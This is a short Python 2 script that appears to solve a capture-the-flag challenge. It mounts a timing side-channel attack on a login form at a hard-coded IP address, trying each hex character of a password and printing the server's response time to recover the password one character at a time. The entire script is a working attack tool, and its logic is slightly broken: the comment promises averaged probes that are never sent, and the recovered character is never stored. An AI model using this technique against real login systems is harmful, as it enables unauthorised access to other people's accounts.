#!/usr/bin/python

import requests
import sys

headers = {
    "Referer": "http://54.175.3.248:8089/",
    "Content-type": "application/x-www-form-urlencoded",
    "Host": "54.175.3.248:8089"
}


def send_request(current_password):
    payload = {"username": "~~FLAG~~", "password": current_password}

    r = requests.post("http://54.175.3.248:8089/premium.php", headers=headers,
                      data=payload)
    return r.elapsed.total_seconds()


charset = "abcdef0123456789"
final_password = sys.argv[1]

current_password = ""
s = ""
for c in charset:
    current_password = final_password + c + "-" * (31 - len(final_password))

    # send payload and check response time, avg from 3 probes
    print "sending payload with password: {}".format(current_password)

    t = send_request(current_password)
    print "time for {} - {}".format(c, t)

final_password += s
print "\n\ncurrent final password: {} ({} chars)\n\n".format(final_password,
                                                             len(
                                                                 final_password))
